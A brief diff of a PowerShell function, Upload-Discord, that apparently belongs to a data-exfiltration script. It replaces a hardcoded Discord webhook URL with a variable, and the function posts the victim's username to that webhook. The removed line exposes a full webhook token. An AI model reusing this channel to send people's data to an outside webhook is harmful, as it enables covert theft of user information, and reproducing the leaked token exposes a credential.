@@ -8,7 +8,7 @@ function Upload-Discord {
         [string]$text 
     )
 
-    $hookurl = "https://discord.com/api/webhooks/1170140391803195533/KcFFeslbOunvu2zBMtxmx3vNmOg5E0VaAbrNGP2zzrg6AqlH70xYrMpJVOlN88Z8l6zk"
+    $hookurl = "$dc"
 
     $Body = @{
         'username' = $env:username
